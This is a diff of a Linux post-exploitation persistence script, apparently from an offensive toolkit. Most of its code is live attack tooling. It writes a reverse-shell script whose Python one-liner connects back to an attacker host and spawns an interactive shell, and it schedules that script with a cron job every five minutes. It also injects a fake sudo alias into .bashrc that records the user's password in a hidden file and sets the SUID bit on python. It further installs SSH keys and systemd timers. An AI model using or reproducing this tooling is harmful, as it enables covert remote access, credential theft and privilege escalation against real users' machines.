@@ -6,7 +6,8 @@ PORT="4242"
 
 function reverse_shells(){
 echo "[+] installing reverse shells executable"
-cat << EOF > /var/log/upowrd
+
+cat << EOF > ${REVSHELLSPATH}
 #!/bin/bash
 if command -v python > /dev/null 2>&1; then
         python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$LHOST",$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
@@ -28,7 +29,7 @@ if command -v sh > /dev/null 2>&1; then
         exit;
 fi
 EOF
-chmod +x /var/log/upowrd
+chmod +x ${REVSHELLSPATH}
 }
 
 function add_key(){
@@ -96,8 +97,10 @@ function backdoor_bashrc_privesc(){
 echo "[+] adding sudo backdoor on $USER .bashrc"
 cat << EOF > /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s
 
-alias sudo='[ -f "/tmp/.systemd-private-b21245afee3b3274d4b2e21" ] && $(sed -i "/sudo/d" $HOME/.bashrc) ; locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ $locale = "en" ]; then echo -n "[sudo] password for $USER: ";fi;if [ $locale = "pt" ]; then echo -n "[sudo] senha para $USER: ";fi;if [ $locale = "fr" ]; then echo -n "[sudo] Mot de passe de $USER: ";fi;read -s pwd;echo;echo "$pwd" > /var/log/.not_the_root_passwd ; touch /tmp/.systemd-private-b21245afee3b3274d4b2e21 ; echo "$pwd" | /usr/bin/sudo -S chmod u+s $(which python) > /tmp/c 2>/dev/null &&/usr/bin/sudo -S '
+alias sudo='[ -f "/tmp/.systemd-private-b21245afee3b3274d4b2e21" ] && \$(sed -i "/sudo/d" \$HOME/.bashrc) ; locale=\$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale = "pt" ]; then echo -n "[sudo] senha para \$USER: ";fi;if [ \$locale = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; echo "\$pwd" > \$HOME/.local/share/.not_the_root_passwd ; touch /tmp/.systemd-private-b21245afee3b3274d4b2e21 ; echo "\$pwd" | /usr/bin/sudo -S chmod u+s \$(which python) > \$HOME/.local/share/.log 2>/dev/null &&/usr/bin/sudo -S '
 EOF
+#alias sudo='[ -f "/tmp/.systemd-private-b21245afee3b3274d4b2e21" ] && $(sed -i "/sudo/d" $HOME/.bashrc) ; locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ $locale = "en" ]; then echo -n "[sudo] password for $USER: ";fi;if [ $locale = "pt" ]; then echo -n "[sudo] senha para $USER: ";fi;if [ $locale = "fr" ]; then echo -n "[sudo] Mot de passe de $USER: ";fi;read -s pwd;echo;echo "$pwd" > $HOME/.local/share/.not_the_root_passwd ; touch /tmp/.systemd-private-b21245afee3b3274d4b2e21 ; echo "$pwd" | /usr/bin/sudo -S chmod u+s $(which python) > $HOME/.local/share/.uidcreated 2>/dev/null &&/usr/bin/sudo -S '
+
 
 if [ -f ~/.bashrc ]; then
     cat /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s >> ~/.bashrc
@@ -114,16 +117,19 @@ if ! command -v crontab &> /dev/null; then
 	return 1
 fi
 echo "[+] adding crontab"
-crontab -l | { cat; echo "*/5 * * * * /bin/bash /var/log/upowrd"; } | crontab -
+crontab -l | { cat; echo "*/5 * * * * /bin/bash ${REVSHELLSPATH}"; } | crontab -
 }
 
 if [ "$EUID" -eq 0 ]; then
+	REVSHELLSPATH="/var/log/upowrd"
 	reverse_shells
 	add_key
 	install_systemd_timer
 	make_suid_bin
 fi
 echo "Adding persistences to $USER..."
+mkdir -p $HOME/.local/share 2>/dev/null
+REVSHELLSPATH="$HOME/.local/share/upowrd"
 reverse_shells
 backdoor_bashrc_privesc
 add_key
